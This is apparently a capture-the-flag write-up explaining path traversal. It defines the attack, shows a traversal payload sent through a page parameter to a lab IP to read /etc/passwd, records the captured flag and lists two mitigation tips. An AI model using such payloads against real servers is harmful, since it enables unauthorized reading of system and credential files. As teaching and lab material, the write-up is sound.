# Path_Traversal

A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).

This attack is also known as “dot-dot-slash”, “directory traversal”, “directory climbing” and “backtracking”.

## Do_some_path_traversal

    Example: ../../../../../../../../../etc/passwd

    /etc/passwd is unix password file

    So i try this: http://192.168.56.101/?page=../../../../../../../../../etc/passwd.
    And i get a flag: b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

## Solutions:

    - Ensure the user cannot supply all parts of the path – surround it with your path code
    - Prefer working without user input when using file system calls